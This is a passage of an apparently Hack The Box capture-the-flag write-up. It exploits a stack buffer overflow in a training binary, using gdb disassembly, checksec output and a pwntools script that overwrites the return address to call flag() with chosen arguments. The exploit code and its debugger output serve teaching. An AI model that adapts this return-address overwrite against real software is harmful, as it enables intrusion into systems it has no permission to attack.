</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ disass flag
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> flag:
</span></span><span class=line><span class=cl>   0x080491e2 &lt;+0&gt;:	push   ebp
</span></span><span class=line><span class=cl>   0x080491e3 &lt;+1&gt;:	mov    ebp,esp
</span></span><span class=line><span class=cl>   0x080491e5 &lt;+3&gt;:	push   ebx
</span></span><span class=line><span class=cl>   0x080491e6 &lt;+4&gt;:	sub    esp,0x54
</span></span><span class=line><span class=cl>   0x080491e9 &lt;+7&gt;:	call   0x8049120 &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span class=line><span class=cl>   0x080491ee &lt;+12&gt;:	add    ebx,0x2e12
</span></span><span class=line><span class=cl>   0x080491f4 &lt;+18&gt;:	sub    esp,0x8
</span></span><span class=line><span class=cl>   0x080491f7 &lt;+21&gt;:	lea    eax,<span class=o>[</span>ebx-0x1ff8<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x080491fd &lt;+27&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x080491fe &lt;+28&gt;:	lea    eax,<span class=o>[</span>ebx-0x1ff6<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x08049204 &lt;+34&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x08049205 &lt;+35&gt;:	call   0x80490b0 &lt;fopen@plt&gt;
</span></span><span class=line><span class=cl>   0x0804920a &lt;+40&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x0804920d &lt;+43&gt;:	mov    DWORD PTR <span class=o>[</span>ebp-0xc<span class=o>]</span>,eax
</span></span><span class=line><span class=cl>   0x08049210 &lt;+46&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp-0xc<span class=o>]</span>,0x0
</span></span><span class=line><span class=cl>   0x08049214 &lt;+50&gt;:	jne    0x8049232 &lt;flag+80&gt;
</span></span><span class=line><span class=cl>   0x08049216 &lt;+52&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x08049219 &lt;+55&gt;:	lea    eax,<span class=o>[</span>ebx-0x1fec<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x0804921f &lt;+61&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x08049220 &lt;+62&gt;:	call   0x8049070 &lt;puts@plt&gt;
</span></span><span class=line><span class=cl>   0x08049225 &lt;+67&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x08049228 &lt;+70&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x0804922b &lt;+73&gt;:	push   0x0
</span></span><span class=line><span class=cl>   0x0804922d &lt;+75&gt;:	call   0x8049080 &lt;exit@plt&gt;
</span></span><span class=line><span class=cl>   0x08049232 &lt;+80&gt;:	sub    esp,0x4
</span></span><span class=line><span class=cl>   0x08049235 &lt;+83&gt;:	push   DWORD PTR <span class=o>[</span>ebp-0xc<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x08049238 &lt;+86&gt;:	push   0x40
</span></span><span class=line><span class=cl>   0x0804923a &lt;+88&gt;:	lea    eax,<span class=o>[</span>ebp-0x4c<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x0804923d &lt;+91&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x0804923e &lt;+92&gt;:	call   0x8049050 &lt;fgets@plt&gt;
</span></span><span class=line><span class=cl>   0x08049243 &lt;+97&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x08049246 &lt;+100&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0x8<span class=o>]</span>,0xdeadbeef
</span></span><span class=line><span class=cl>   0x0804924d &lt;+107&gt;:	jne    0x8049269 &lt;flag+135&gt;
</span></span><span class=line><span class=cl>   0x0804924f &lt;+109&gt;:	cmp    DWORD PTR <span class=o>[</span>ebp+0xc<span class=o>]</span>,0xc0ded00d
</span></span><span class=line><span class=cl>   0x08049256 &lt;+116&gt;:	jne    0x804926c &lt;flag+138&gt;
</span></span><span class=line><span class=cl>   0x08049258 &lt;+118&gt;:	sub    esp,0xc
</span></span><span class=line><span class=cl>   0x0804925b &lt;+121&gt;:	lea    eax,<span class=o>[</span>ebp-0x4c<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x0804925e &lt;+124&gt;:	push   eax
</span></span><span class=line><span class=cl>   0x0804925f &lt;+125&gt;:	call   0x8049030 &lt;printf@plt&gt;
</span></span><span class=line><span class=cl>   0x08049264 &lt;+130&gt;:	add    esp,0x10
</span></span><span class=line><span class=cl>   0x08049267 &lt;+133&gt;:	jmp    0x804926d &lt;flag+139&gt;
</span></span><span class=line><span class=cl>   0x08049269 &lt;+135&gt;:	nop
</span></span><span class=line><span class=cl>   0x0804926a &lt;+136&gt;:	jmp    0x804926d &lt;flag+139&gt;
</span></span><span class=line><span class=cl>   0x0804926c &lt;+138&gt;:	nop
</span></span><span class=line><span class=cl>   0x0804926d &lt;+139&gt;:	mov    ebx,DWORD PTR <span class=o>[</span>ebp-0x4<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x08049270 &lt;+142&gt;:	leave  
</span></span><span class=line><span class=cl>   0x08049271 &lt;+143&gt;:	ret    
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><h2 id=generating-payload-with-pwntools><strong>GENERATING-PAYLOAD-WITH-PWNTOOLS</strong><a hidden class=anchor aria-hidden=true href=#generating-payload-with-pwntools>#</a></h2><p>It&rsquo;s time to set out to create our <strong>payload</strong>. Using <a href=https://docs.pwntools.com/en/stable/ title=pwntools>pwntools</a> in a scenario like this could immensely speed up the whole <strong>payload generation</strong> process.</p><p>There are <strong>clear instructions</strong> on the website regarding the <strong>installation</strong>, so we just follow along.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>apt-get update
</span></span><span class=line><span class=cl>apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
</span></span><span class=line><span class=cl>python3 -m pip install --upgrade pip
</span></span><span class=line><span class=cl>python3 -m pip install --upgrade pwntools
</span></span></code></pre></div><p>Once <strong>installed</strong>, let&rsquo;s create a <strong>scipt</strong> for <strong>payload generation</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>touch payload-get.py
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ touch payload-gen.py
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ codium payload-gen.py
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Moreover, let&rsquo;s use the <em><strong>checksec</strong></em> command to check the <strong>binary security settings</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>checksec vuln
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ checksec --help
</span></span><span class=line><span class=cl>usage: pwn checksec <span class=o>[</span>-h<span class=o>]</span> <span class=o>[</span>--file <span class=o>[</span>elf ...<span class=o>]]</span> <span class=o>[</span>elf ...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Check binary security settings
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>positional arguments:
</span></span><span class=line><span class=cl>  elf               Files to check
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>optional arguments:
</span></span><span class=line><span class=cl>  -h, --help        show this <span class=nb>help</span> message and <span class=nb>exit</span>
</span></span><span class=line><span class=cl>  --file <span class=o>[</span>elf ...<span class=o>]</span>  File to check <span class=o>(</span><span class=k>for</span> compatibility with checksec.sh<span class=o>)</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ checksec vuln
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/htb-bluewalle/you-know-0xdiablos/vuln&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     i386-32-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX disabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</span></span><span class=line><span class=cl>    RWX:      Has RWX segments
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>There a couple of thing&rsquo;s we need to keep in mind when we create the <strong>payload</strong>:</p><ul><li>our target is a <strong>32-bit</strong> executable</li><li>endianness: little-endian (LE) &ndash; from <strong>LSB executable</strong> ( - <em><strong>file vuln</strong></em> - output)</li></ul><p>As for the <strong>script</strong>, it&rsquo;s just mostly just <strong>putting together</strong> all the little pieces we gathered up to now.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># payload-gen.py</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mi>188</span>
</span></span><span class=line><span class=cl><span class=n>flag_addr</span> <span class=o>=</span> <span class=mh>0x080491e2</span>
</span></span><span class=line><span class=cl><span class=n>eip_addr</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>flag_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>garbage</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=n>offset</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>previous_frame</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>param_1</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>param_2</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0xc0ded00d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>garbage</span> <span class=o>+</span> <span class=n>eip_addr</span> <span class=o>+</span> <span class=n>previous_frame</span> <span class=o>+</span> <span class=n>param_1</span> <span class=o>+</span> <span class=n>param_2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;payload.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><p>It&rsquo;s one of the simplest ones, but even here, there are a few things to take a note of:</p><ul><li>the <strong>return address</strong> which we overwrite, - <em>eip_addr</em> - is packaged as <strong>hex</strong> in a <strong>little endian</strong> format (default for <strong>p32()</strong>)</li><li>the <strong>output file</strong> - <em>payload.txt</em> - is opened in a <strong>binary</strong> (b) mode for <strong>writing</strong> (w)</li><li>we use <strong>c calling conventions</strong> to determine which parameter goes first and which second</li><li>the data in <em><strong>previous_frame</strong></em> is arbitrary, it simply acts as a filler, but it has to be <strong>exactly 4 byte long</strong></li><li>the same <strong>packaging</strong> is used on the <strong>parameters</strong> as with the flag&rsquo;s starting address</li></ul><p>It&rsquo;s time for a <strong>test</strong>. Let&rsquo;s set a <strong>breakpoint</strong> at the <em><strong>flag()</strong></em> function</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>b flag
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gdb -q vuln
</span></span><span class=line><span class=cl>Reading symbols from vuln...
</span></span><span class=line><span class=cl><span class=o>(</span>No debugging symbols found in vuln<span class=o>)</span>
</span></span><span class=line><span class=cl>gdb-peda$ b flag
</span></span><span class=line><span class=cl>Breakpoint <span class=m>1</span> at 0x80491e6
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>before feeding the <strong>executable</strong> our new <strong>payload</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>r &lt; payload.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>gdb-peda$ r &lt; payload.txt 
</span></span><span class=line><span class=cl>Starting program: /home/htb-bluewalle/you-know-0xdiablos/vuln &lt; payload.txt
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
</span></span><span class=line><span class=cl><span class=o>[</span>----------------------------------registers-----------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>EAX: 0xc1 
</span></span><span class=line><span class=cl>EBX: 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ECX: 0xffffffff 
</span></span><span class=line><span class=cl>EDX: 0xffffffff 
</span></span><span class=line><span class=cl>ESI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EDI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EBP: 0xffffd05c <span class=o>(</span><span class=s2>&#34;AAAA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ESP: 0xffffd058 <span class=o>(</span><span class=s2>&#34;AAAAAAAA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EIP: 0x80491e6 <span class=o>(</span>&lt;flag+4&gt;:	sub    esp,0x54<span class=o>)</span>
</span></span><span class=line><span class=cl>EFLAGS: 0x286 <span class=o>(</span>carry PARITY adjust zero SIGN <span class=nb>trap</span> INTERRUPT direction overflow<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-------------------------------------code-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x80491e2 &lt;flag&gt;:	push   ebp
</span></span><span class=line><span class=cl>   0x80491e3 &lt;flag+1&gt;:	mov    ebp,esp
</span></span><span class=line><span class=cl>   0x80491e5 &lt;flag+3&gt;:	push   <span class=nv>ebx</span>
</span></span><span class=line><span class=cl><span class=o>=</span>&gt; 0x80491e6 &lt;flag+4&gt;:	sub    esp,0x54
</span></span><span class=line><span class=cl>   0x80491e9 &lt;flag+7&gt;:	call   0x8049120 &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span class=line><span class=cl>   0x80491ee &lt;flag+12&gt;:	add    ebx,0x2e12
</span></span><span class=line><span class=cl>   0x80491f4 &lt;flag+18&gt;:	sub    esp,0x8
</span></span><span class=line><span class=cl>   0x80491f7 &lt;flag+21&gt;:	lea    eax,<span class=o>[</span>ebx-0x1ff8<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------stack-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>0000<span class=p>|</span> 0xffffd058 <span class=o>(</span><span class=s2>&#34;AAAAAAAA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0004<span class=p>|</span> 0xffffd05c <span class=o>(</span><span class=s2>&#34;AAAA&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0008<span class=p>|</span> 0xffffd060 --&gt; 0x0 
</span></span><span class=line><span class=cl>0012<span class=p>|</span> 0xffffd064 --&gt; 0xffffd134 --&gt; 0xffffd2ca <span class=o>(</span><span class=s2>&#34;/home/htb-bluewalle/you-know-0xdiablos/vuln&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0016<span class=p>|</span> 0xffffd068 --&gt; 0xffffd13c --&gt; 0xffffd2f6 <span class=o>(</span><span class=s2>&#34;SHELL=/bin/bash&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0020<span class=p>|</span> 0xffffd06c --&gt; 0x3eb 
</span></span><span class=line><span class=cl>0024<span class=p>|</span> 0xffffd070 --&gt; 0xffffd090 --&gt; 0x1 
</span></span><span class=line><span class=cl>0028<span class=p>|</span> 0xffffd074 --&gt; 0x0 
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------------------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Legend: code, data, rodata, value
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Breakpoint 1, 0x080491e6 in flag <span class=o>()</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>It worked, the <strong>execution flow</strong> was successfully <strong>redirected</strong> to the <em><strong>flag()</strong></em> function. Taking an other look at the <strong>decompiled</strong> <em><strong>flag()</strong></em> function, we notice our next hurdle:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Put plainly, we can only pass if the <strong>file</strong> mentioned - <em>flag.txt</em> - was <strong>successfully opened</strong>. So let&rsquo;s <strong>create</strong> such a file locally.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s2>&#34;SUCCESS&#34;</span> &gt; flag.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>echo</span> -n <span class=s2>&#34;SUCCESS&#34;</span> &gt; flag.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat flag.txt 
</span></span><span class=line><span class=cl>SUCCESS┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Let&rsquo;s run <em><strong>gdb</strong></em> again</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb commands</span>
</span></span><span class=line><span class=cl>b flag
</span></span><span class=line><span class=cl>r &lt; payload.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ gdb -q vuln
</span></span><span class=line><span class=cl>Reading symbols from vuln...
</span></span><span class=line><span class=cl><span class=o>(</span>No debugging symbols found in vuln<span class=o>)</span>
</span></span><span class=line><span class=cl>gdb-peda$ b flag
</span></span><span class=line><span class=cl>Breakpoint <span class=m>1</span> at 0x80491e6
</span></span><span class=line><span class=cl>gdb-peda$ r &lt; payload.txt
</span></span><span class=line><span class=cl>Starting program: /home/htb-bluewalle/you-know-0xdiablos/vuln &lt; payload.txt
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���Aﾭ�
</span></span><span class=line><span class=cl><span class=o>[</span>----------------------------------registers-----------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>EAX: 0xcd 
</span></span><span class=line><span class=cl>EBX: 0x41414141 <span class=o>(</span><span class=s1>&#39;AAAA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ECX: 0xffffffff 
</span></span><span class=line><span class=cl>EDX: 0xffffffff 
</span></span><span class=line><span class=cl>ESI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EDI: 0xf7faa000 --&gt; 0x1e3d6c 
</span></span><span class=line><span class=cl>EBP: 0xffffd05c <span class=o>(</span><span class=s2>&#34;AAAAAAAAﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>ESP: 0xffffd058 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>12</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>EIP: 0x80491e6 <span class=o>(</span>&lt;flag+4&gt;:	sub    esp,0x54<span class=o>)</span>
</span></span><span class=line><span class=cl>EFLAGS: 0x286 <span class=o>(</span>carry PARITY adjust zero SIGN <span class=nb>trap</span> INTERRUPT direction overflow<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-------------------------------------code-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x80491e2 &lt;flag&gt;:	push   ebp
</span></span><span class=line><span class=cl>   0x80491e3 &lt;flag+1&gt;:	mov    ebp,esp
</span></span><span class=line><span class=cl>   0x80491e5 &lt;flag+3&gt;:	push   <span class=nv>ebx</span>
</span></span><span class=line><span class=cl><span class=o>=</span>&gt; 0x80491e6 &lt;flag+4&gt;:	sub    esp,0x54
</span></span><span class=line><span class=cl>   0x80491e9 &lt;flag+7&gt;:	call   0x8049120 &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span class=line><span class=cl>   0x80491ee &lt;flag+12&gt;:	add    ebx,0x2e12
</span></span><span class=line><span class=cl>   0x80491f4 &lt;flag+18&gt;:	sub    esp,0x8
</span></span><span class=line><span class=cl>   0x80491f7 &lt;flag+21&gt;:	lea    eax,<span class=o>[</span>ebx-0x1ff8<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------stack-------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>0000<span class=p>|</span> 0xffffd058 <span class=o>(</span><span class=s1>&#39;A&#39;</span> &lt;repeats <span class=m>12</span> times&gt;, <span class=s2>&#34;ﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0004<span class=p>|</span> 0xffffd05c <span class=o>(</span><span class=s2>&#34;AAAAAAAAﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0008<span class=p>|</span> 0xffffd060 <span class=o>(</span><span class=s2>&#34;AAAAﾭ\336\r\320\336\300&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>0012<span class=p>|</span> 0xffffd064 --&gt; 0xdeadbeef 
</span></span><span class=line><span class=cl>0016<span class=p>|</span> 0xffffd068 --&gt; 0xc0ded00d 
</span></span><span class=line><span class=cl>0020<span class=p>|</span> 0xffffd06c --&gt; 0x300 
</span></span><span class=line><span class=cl>0024<span class=p>|</span> 0xffffd070 --&gt; 0xffffd090 --&gt; 0x1 
</span></span><span class=line><span class=cl>0028<span class=p>|</span> 0xffffd074 --&gt; 0x0 
</span></span><span class=line><span class=cl><span class=o>[</span>------------------------------------------------------------------------------<span class=o>]</span>
</span></span><span class=line><span class=cl>Legend: code, data, rodata, value
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Breakpoint 1, 0x080491e6 in flag <span class=o>()</span>
</span></span><span class=line><span class=cl>gdb-peda$
</span></span></code></pre></div><p>and set two <strong>breakpoints</strong> at the addresses where the <strong>parameters</strong> are compared.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=na>...</span>
</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x08049246</span> <span class=err>&lt;+</span><span class=mi>100</span><span class=err>&gt;</span><span class=p>:</span>	<span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>ebp</span><span class=err>+</span><span class=mi>0x8</span><span class=p>],</span><span class=mi>0xdeadbeef</span>
</span></span><span class=line><span class=cl><span class=na>...</span>
</span></span><span class=line><span class=cl><span class=err>0</span><span class=nf>x0804924f</span> <span class=err>&lt;+</span><span class=mi>109</span><span class=err>&gt;</span><span class=p>:</span>	<span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>ebp</span><span class=err>+</span><span class=mi>0xc</span><span class=p>],</span><span class=mi>0xc0ded00d</span>
</span></span><span class=line><span class=cl><span class=na>...</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># gdb command</span>
</span></span><span class=line><span class=cl>gdb-peda$ b *0x08049246
</span></span><span class=line><span class=cl>gdb-peda$ b *0x0804924f
